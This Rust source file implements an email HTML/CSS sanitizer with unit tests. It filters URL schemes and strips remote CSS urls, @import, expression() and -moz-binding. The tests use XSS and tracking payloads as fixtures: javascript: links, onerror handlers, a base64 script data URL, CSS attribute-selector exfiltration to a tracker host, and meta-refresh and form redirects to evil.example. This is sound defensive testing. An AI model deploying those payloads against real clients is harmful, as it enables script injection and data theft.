const SOURCE_BODY_MARKER_ATTRIBUTE: &str = "data-satchel-source-body";

/// Schemes a link may still carry after sanitizing.
const LINK_URL_SCHEMES: &[&str] = &["http", "https", "mailto"];
/// Schemes that resolve inside the message or the app, never on the network.
const LOCAL_URL_SCHEMES: &[&str] = &["cid", "data", "blob", "asset"];
/// Schemes an image source may carry.
const IMAGE_URL_SCHEMES: &[&str] = &["http", "https", "cid", "data", "blob", "asset"];

/// Returns the lowercased scheme of a URL reference, or `None` when it carries
/// none. ASCII whitespace and control characters are ignored the way a browser
/// ignores them, so `java&#9;script:` reads as a scheme and not as a path.
fn url_scheme(value: &str) -> Option<String> {
    let mut scheme = String::new();
    for ch in value.chars() {
        if ch.is_ascii_whitespace() || ch.is_ascii_control() {
            continue;
        }
        if ch == ':' {
            return if scheme.is_empty() {
                None
            } else {
                Some(scheme)
            };
        }
        let valid = if scheme.is_empty() {
            ch.is_ascii_alphabetic()
        } else {
            ch.is_ascii_alphanumeric() || matches!(ch, '+' | '-' | '.')
        };
        if !valid {
            return None;
        }
        scheme.push(ch.to_ascii_lowercase());
    }
    None
}

/// A reference without a scheme is relative and has no scheme to abuse, which
/// is also what ammonia does with one today.
fn scheme_is_allowed(value: &str, allowed: &[&str]) -> bool {
    match url_scheme(value) {
        Some(scheme) => allowed.contains(&scheme.as_str()),
        None => true,
    }
}

/// `srcset` is a comma-separated candidate list, and ammonia does not count it
/// as a URL attribute at all — nothing else checks its schemes.
fn srcset_is_allowed(value: &str) -> bool {
    value
        .split(',')
        .filter_map(|candidate| candidate.split_ascii_whitespace().next())
        .all(|url| scheme_is_allowed(url, IMAGE_URL_SCHEMES))
}

/// Whether one `url(...)` payload resolves inside the message. An allowlist,
/// not a denylist: a comment or a stray quote hiding the scheme reads as
/// "not local" and the reference is dropped.
fn css_url_is_local(inner: &str) -> bool {
    let trimmed = inner.trim();
    let unquoted = trimmed
        .strip_prefix('"')
        .and_then(|rest| rest.strip_suffix('"'))
        .or_else(|| {
            trimmed
                .strip_prefix('\'')
                .and_then(|rest| rest.strip_suffix('\''))
        })
        .unwrap_or(trimmed)
        .trim();
    if unquoted.starts_with('#') {
        return true;
    }
    match url_scheme(unquoted) {
        Some(scheme) => LOCAL_URL_SCHEMES.contains(&scheme.as_str()),
        None => false,
    }
}

fn replace_case_insensitive(css: &str, needle: &str, replacement: &str) -> String {
    let haystack = css.to_ascii_lowercase();
    let mut out = String::with_capacity(css.len());
    let mut cursor = 0usize;
    while let Some(found) = haystack[cursor..].find(needle) {
        let start = cursor + found;
        out.push_str(&css[cursor..start]);
        out.push_str(replacement);
        cursor = start + needle.len();
    }
    out.push_str(&css[cursor..]);
    out
}

fn strip_at_imports(css: &str) -> String {
    let haystack = css.to_ascii_lowercase();
    let mut out = String::with_capacity(css.len());
    let mut cursor = 0usize;
    while let Some(found) = haystack[cursor..].find("@import") {
        let start = cursor + found;
        out.push_str(&css[cursor..start]);
        let rest = &haystack[start..];
        cursor = match rest.find([';', '}']) {
            Some(end) if rest.as_bytes()[end] == b'}' => start + end,
            Some(end) => start + end + 1,
            None => css.len(),
        };
    }
    out.push_str(&css[cursor..]);
    out
}

fn neutralize_css_urls(css: &str) -> String {
    let haystack = css.to_ascii_lowercase();
    let mut out = String::with_capacity(css.len());
    let mut cursor = 0usize;
    while let Some(found) = haystack[cursor..].find("url(") {
        let start = cursor + found;
        let open = start + "url(".len();
        let Some(close) = haystack[open..].find(')') else {
            // An unterminated url() swallows the rest of the stylesheet.
            out.push_str(&css[cursor..start]);
            out.push_str("none");
            return out;
        };
        let close = open + close;
        out.push_str(&css[cursor..start]);
        if css_url_is_local(&css[open..close]) {
            out.push_str(&css[start..=close]);
        } else {
            out.push_str("none");
        }
        cursor = close + 1;
    }
    out.push_str(&css[cursor..]);
    out
}

/// Ammonia hands CSS through untouched, so the sender's rules reach the
/// document verbatim. Strip the constructs that turn a stylesheet into a
/// network client or a script host and leave the rest, so layout survives.
fn sanitize_css(css: &str) -> String {
    let css = strip_at_imports(css);
    let css = neutralize_css_urls(&css);
    // Renamed rather than cut out: the declaration stays syntactically whole
    // and the CSS parser drops it, and no replacement contains the token it
    // replaces, so a second pass has nothing left to find.
    let css = replace_case_insensitive(&css, "expression(", "-satchel-blocked-fn(");
    let css = replace_case_insensitive(&css, "behavior:", "-satchel-blocked:");
    replace_case_insensitive(&css, "-moz-binding", "-satchel-blocked-binding")
}

/// Rewrite parsed CSS before ammonia sees the final serialized markup.
fn sanitize_style_blocks(document: &mut scraper::Html) {
    let selector = scraper::Selector::parse("style").expect("static style selector");
    let replacements = document
        .select(&selector)
        .flat_map(|style| {
            style.children().filter_map(|child| {
                child
                    .value()
                    .as_text()
                    .map(|text| (child.id(), sanitize_css(text)))
            })
        })
        .collect::<Vec<_>>();
    for (id, css) in replacements {
        if let Some(mut node) = document.tree.get_mut(id) {
            if let scraper::Node::Text(text) = node.value() {
                text.text = css.into();
            }
        }
    }
}

fn build_email_html_sanitizer<'a>(allow_source_body_marker: bool) -> ammonia::Builder<'a> {
    let mut builder = ammonia::Builder::default();
    builder
        .add_tags(&["body", "font", "head", "html", "style"])
        .add_clean_content_tags(&["title"])
        .rm_clean_content_tags(&["style"])
        .add_generic_attributes(&[
            "align",
            "background",
            "bgcolor",
            "border",
            "cellpadding",
            "cellspacing",
            "class",
            "color",
            "dir",
            "face",
            "height",
            "id",
            "name",
            "role",
            "style",
            "valign",
            "width",
        ])
        .add_generic_attribute_prefixes(&["aria-", "data-"])
        .add_tag_attributes("a", &["name"])
        .add_tag_attributes("img", &["src", "srcset"])
        .add_tag_attributes("font", &["size"])
        // Ammonia drops an attribute whose scheme is missing here before the
        // filter below ever sees it, so the local schemes have to pass this
        // gate; narrowing them down per attribute is the filter's job.
        .add_url_schemes(&["cid", "data", "blob", "asset"])
        .attribute_filter(move |element, attribute, value| {
            if attribute == SOURCE_BODY_MARKER_ATTRIBUTE && !allow_source_body_marker {
                return None;
            }
            let keep = match (element, attribute) {
                ("img", "src") => scheme_is_allowed(value, IMAGE_URL_SCHEMES),
                ("img", "srcset") => srcset_is_allowed(value),
                (_, "src") | (_, "href") => scheme_is_allowed(value, LINK_URL_SCHEMES),
                _ => true,
            };
            if !keep {
                return None;
            }
            if attribute == "style" {
                return Some(sanitize_css(value).into());
            }
            Some(value.into())
        })
        .link_rel(Some("noopener noreferrer"));
    builder
}

fn escape_html_attribute(value: &str) -> String {
    value
        .replace('&', "&amp;")
        .replace('"', "&quot;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

/// Ammonia parses fragments in a synthetic div, so document-level body
/// attributes disappear even though the tag itself is allow-listed. Preserve
/// the two presentation attributes the frontend deliberately carries onto its
/// isolated wrapper. The marker is sanitized independently and prepended after
/// the untrusted message has been cleaned, making its first position trustworthy
/// even when a sender uses the same data attribute.
fn sanitized_source_body_marker(input: &str) -> Option<String> {
    let document = scraper::Html::parse_document(input);
    let selector = scraper::Selector::parse("body").expect("static body selector is valid");
    let body = document.select(&selector).next();
    let class_name = body.and_then(|element| element.attr("class"));
    let style = body.and_then(|element| element.attr("style"));
    if class_name.is_none() && style.is_none() {
        return None;
    }

    let mut marker = String::from(r#"<div data-satchel-source-body="on""#);
    if let Some(class_name) = class_name {
        marker.push_str(r#" class=""#);
        marker.push_str(&escape_html_attribute(class_name));
        marker.push('"');
    }
    if let Some(style) = style {
        marker.push_str(r#" style=""#);
        marker.push_str(&escape_html_attribute(style));
        marker.push('"');
    }
    marker.push_str("></div>");

    Some(build_email_html_sanitizer(true).clean(&marker).to_string())
}

pub fn sanitize_html(input: &str) -> String {
    ammonia::Builder::default()
        .link_rel(Some("noopener noreferrer"))
        .clean(input)
        .to_string()
}

pub fn sanitize_email_html(input: &str) -> String {
    sanitize_email_html_inner(input, false)
}

/// Recheck stored HTML without losing its sanitized body presentation marker.
pub fn sanitize_stored_email_html(input: &str) -> String {
    sanitize_email_html_inner(input, true)
}

fn sanitize_email_html_inner(input: &str, preserve_marker: bool) -> String {
    let mut document = scraper::Html::parse_document(input);
    let mut marker = sanitized_source_body_marker(input);
    if preserve_marker && marker.is_none() {
        let selector =
            scraper::Selector::parse("body > div:first-child").expect("static marker selector");
        let stored_marker = document
            .select(&selector)
            .next()
            .filter(|element| {
                element.attr(SOURCE_BODY_MARKER_ATTRIBUTE) == Some("on")
                    && element.inner_html().is_empty()
            })
            .map(|element| (element.id(), element.html()));
        if let Some((id, html)) = stored_marker {
            marker = Some(build_email_html_sanitizer(true).clean(&html).to_string());
            if let Some(mut node) = document.tree.get_mut(id) {
                node.detach();
            }
        }
    }
    sanitize_style_blocks(&mut document);
    let content = build_email_html_sanitizer(false)
        .clean(&document.html())
        .to_string();
    if let Some(marker) = marker {
        // The marker is ours; strip sender markers first, then clean the complete result.
        build_email_html_sanitizer(true)
            .clean(&format!("{marker}{content}"))
            .to_string()
    } else {
        content
    }
}

pub async fn sanitize_optional_email_html(
    input: Option<String>,
) -> Result<Option<String>, tokio::task::JoinError> {
    let Some(input) = input else {
        return Ok(None);
    };
    tokio::task::spawn_blocking(move || {
        let sanitized = sanitize_email_html(&input);
        (!sanitized.trim().is_empty()).then_some(sanitized)
    })
    .await
}

#[cfg(test)]
mod tests {
    use super::{sanitize_email_html, sanitize_html, SOURCE_BODY_MARKER_ATTRIBUTE};

    #[test]
    fn output_pass_preserves_ingested_body_presentation() {
        let ingested = sanitize_email_html(
            r#"<body class="campaign" style="font-family:serif"><p>Hi</p></body>"#,
        );
        let read = super::sanitize_stored_email_html(&ingested);
        let reread = super::sanitize_stored_email_html(&read);
        let selector = scraper::Selector::parse("[data-satchel-source-body]").unwrap();
        for output in [ingested, read, reread] {
            let document = scraper::Html::parse_document(&output);
            let markers = document.select(&selector).collect::<Vec<_>>();
            assert_eq!(markers.len(), 1);
            assert_eq!(markers[0].attr("class"), Some("campaign"));
            assert_eq!(markers[0].attr("style"), Some("font-family:serif"));
            assert!(output.contains("<p>Hi</p>"));
        }
    }

    #[test]
    fn css_cleanup_cannot_create_markup_after_sanitizing() {
        let payload = r#"<p>Hi</p><style></sty@import;le><link rel="preconnect" href="https://u123.t.example"><meta http-equiv="refresh" content="0;url=https://evil.example/login"></style>"#;
        for raw in [
            payload.to_string(),
            payload.replace("@import;", "url()"),
            payload.replace("@import;", "expression("),
            payload.replace("@import;", "behavior:"),
            payload.replace("@import;", "-moz-binding"),
        ] {
            let output = sanitize_email_html(&raw);
            let document = scraper::Html::parse_document(&output);
            let selector = scraper::Selector::parse("link, meta").unwrap();
            assert_eq!(document.select(&selector).count(), 0, "{output}");
        }
    }

    #[test]
    fn removes_scripts_event_handlers_and_js_urls() {
        let raw = r#"
            <div onclick="steal()">
                <script>alert(1)</script>
                <a href="javascript:alert(1)">bad</a>
                <img src="x" onerror="hack()">
            </div>
        "#;

        let sanitized = sanitize_html(raw);

        assert!(!sanitized.contains("<script"));
        assert!(!sanitized.contains("onclick"));
        assert!(!sanitized.contains("onerror"));
        assert!(!sanitized.contains("javascript:"));
    }

    #[test]
    fn preserves_safe_markup() {
        let raw = r#"<p>Hello <strong>team</strong> <a href="https://example.com">open</a></p>"#;

        let sanitized = sanitize_html(raw);

        assert!(sanitized.contains("<strong>team</strong>"));
        assert!(sanitized.contains("https://example.com"));
        assert!(sanitized.contains("rel=\"noopener noreferrer\""));
    }

    #[test]
    fn preserves_email_css_and_classes() {
        let raw = r##"
            <style>
                .dark-logo { display: none; }
            </style>
            <table class="wrapper" style="background:#000" bgcolor="#000" data-track="hero">
                <tr>
                    <td>
                        <img class="dark-logo" src="https://example.com/logo-dark.png" style="display:none" />
                    </td>
                </tr>
            </table>
        "##;

        let sanitized = sanitize_email_html(raw);

        assert!(sanitized.contains("<style>"));
        assert!(sanitized.contains("class=\"wrapper\""));
        assert!(sanitized.contains("style=\"background:#000\""));
        assert!(sanitized.contains("bgcolor=\"#000\""));
        assert!(sanitized.contains("data-track=\"hero\""));
        assert!(sanitized.contains("class=\"dark-logo\""));
        assert!(sanitized.contains("src=\"https://example.com/logo-dark.png\""));
        assert!(sanitized.contains("display:none"));
    }

    #[test]
    fn preserves_body_presentation_in_a_trusted_marker() {
        let raw = r#"
            <html>
                <body class="campaign" style="margin:0;font-family:Arial,sans-serif" onclick="steal()">
                    <p>Visible message body</p>
                </body>
            </html>
        "#;

        let sanitized = sanitize_email_html(raw);

        assert!(sanitized.starts_with("<div data-satchel-source-body=\"on\""));
        assert!(sanitized.contains("class=\"campaign\""));
        assert!(sanitized.contains("font-family:Arial,sans-serif"));
        assert!(!sanitized.contains("onclick"));
        assert!(sanitized.contains("Visible message body"));
    }

    #[test]
    fn reserves_the_source_body_marker_for_sanitizer_output() {
        let sanitized = sanitize_email_html(
            r#"<div data-satchel-source-body="on" style="font-family:serif">Sender content</div>"#,
        );

        assert!(!sanitized.contains(SOURCE_BODY_MARKER_ATTRIBUTE));
        assert!(sanitized.contains("Sender content"));
    }

    #[test]
    fn leaves_empty_and_fragment_inputs_without_an_internal_marker() {
        assert_eq!(sanitize_email_html(""), "");
        assert_eq!(sanitize_email_html("<p>Fragment</p>"), "<p>Fragment</p>");
    }

    #[test]
    fn removes_document_titles_without_exposing_them_as_body_text() {
        let raw = r#"
            <!doctype html>
            <html>
                <head><title>Duplicate message subject</title></head>
                <body><p>Visible message body</p></body>
            </html>
        "#;

        let sanitized = sanitize_email_html(raw);

        assert!(!sanitized.contains("Duplicate message subject"));
        assert!(sanitized.contains("Visible message body"));
    }

    #[test]
    fn preserves_mail_client_reply_section_markers() {
        let raw = r#"<div name="messageReplySection">On 10 July, Mike wrote:<blockquote>Earlier message</blockquote></div>"#;

        let sanitized = sanitize_email_html(raw);

        assert!(sanitized.contains("name=\"messageReplySection\""));
    }

    #[test]
    fn preserves_local_email_image_sources() {
        let raw = r#"
            <img src="cid:image001.jpg@ABC" />
            <img src="data:image/png;base64,abc123" />
            <img src="blob:tauri://localhost/abc123" />
        "#;

        let sanitized = sanitize_email_html(raw);

        assert!(sanitized.contains("src=\"cid:image001.jpg@ABC\""));
        assert!(sanitized.contains("src=\"data:image/png;base64,abc123\""));
        assert!(sanitized.contains("src=\"blob:tauri://localhost/abc123\""));
    }

    #[test]
    fn email_sanitizer_still_removes_scripts_and_handlers() {
        let raw = r#"
            <style>.safe { color: white; }</style>
            <div class="safe" onclick="steal()">
                <script>alert(1)</script>
                <img src="x" onerror="hack()" style="display:block" />
                <a href="javascript:alert(1)">bad</a>
            </div>
        "#;

        let sanitized = sanitize_email_html(raw);

        assert!(sanitized.contains("<style>"));
        assert!(!sanitized.contains("<script"));
        assert!(!sanitized.contains("onclick"));
        assert!(!sanitized.contains("onerror"));
        assert!(!sanitized.contains("javascript:"));
    }

    #[test]
    fn data_urls_survive_only_in_image_sources() {
        let raw = r#"
            <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Rechnung</a>
            <img src="data:image/png;base64,abc123" />
        "#;

        let sanitized = sanitize_email_html(raw);

        assert!(!sanitized.contains("data:text/html"));
        assert!(sanitized.contains("Rechnung"));
        assert!(sanitized.contains("src=\"data:image/png;base64,abc123\""));
    }

    #[test]
    fn links_keep_only_web_and_mail_schemes() {
        let raw = r#"
            <a href="https://example.com/a">web</a>
            <a href="mailto:team@example.com">mail</a>
            <a href="ftp://example.com/a">ftp</a>
            <a href="cid:image001">cid</a>
            <a href="blob:tauri://localhost/abc">blob</a>
            <a href="asset://localhost/etc/passwd">asset</a>
        "#;

        let sanitized = sanitize_email_html(raw);

        assert!(sanitized.contains("href=\"https://example.com/a\""));
        assert!(sanitized.contains("href=\"mailto:team@example.com\""));
        assert!(!sanitized.contains("ftp://"));
        assert!(!sanitized.contains("href=\"cid:"));
        assert!(!sanitized.contains("href=\"blob:"));
        assert!(!sanitized.contains("asset://"));
    }

    #[test]
    fn image_srcset_drops_foreign_schemes() {
        let allowed = sanitize_email_html(
            r#"<img srcset="https://example.com/a.png 1x, cid:b@c 2x" src="https://example.com/a.png" />"#,
        );
        assert!(allowed.contains("srcset="));

        let denied = sanitize_email_html(
            r#"<img srcset="javascript:alert(1) 1x" src="https://example.com/a.png" />"#,
        );
        assert!(!denied.contains("srcset="));
        assert!(!denied.contains("javascript:"));
    }

    #[test]
    fn style_blocks_lose_remote_urls_and_imports() {
        let raw = r##"
            <style>
                @import url("https://tracker.example/evil.css");
                input[value^="a"] { background: url(https://tracker.example/a); }
                .logo { background: url(cid:logo001@satchel); }
                .ie { width: expression(alert(1)); behavior: url(#default#time2); }
                .moz { -moz-binding: url(https://tracker.example/x.xml#z); }
                .hidden { background: url(/*x*/"https://tracker.example/b"); }
            </style>
            <p>Body</p>
        "##;

        let sanitized = sanitize_email_html(raw);

        assert!(!sanitized.contains("@import"));
        assert!(!sanitized.contains("tracker.example"));
        assert!(!sanitized.contains("expression("));
        assert!(!sanitized.contains("behavior:"));
        assert!(!sanitized.contains("-moz-binding"));
        assert!(sanitized.contains("url(cid:logo001@satchel)"));
        assert!(sanitized.contains("input[value^=\"a\"]"));
        assert!(sanitized.contains("Body"));
    }

    #[test]
    fn style_attributes_lose_remote_urls() {
        let sanitized = sanitize_email_html(
            r#"<div style="background:#000;background-image:url(https://tracker.example/a)">x</div>"#,
        );

        assert!(sanitized.contains("background:#000"));
        assert!(!sanitized.contains("tracker.example"));
    }

    #[test]
    fn dangerous_tags_are_removed() {
        let cases = [
            (
                r#"<form action="https://evil.example"><input name="a" /></form>"#,
                "<form",
            ),
            (
                r#"<meta http-equiv="refresh" content="0;url=https://evil.example" />"#,
                "http-equiv",
            ),
            (r#"<base href="https://evil.example/" />"#, "<base"),
            (r#"<iframe src="https://evil.example"></iframe>"#, "<iframe"),
            (
                r#"<object data="https://evil.example"></object>"#,
                "<object",
            ),
            (
                r#"<svg><use href="https://evil.example#x" /></svg>"#,
                "<svg",
            ),
        ];

        for (raw, forbidden) in cases {
            let sanitized = sanitize_email_html(raw);
            assert!(
                !sanitized.contains(forbidden),
                "{forbidden} survived sanitizing of {raw}: {sanitized}"
            );
        }
    }
}
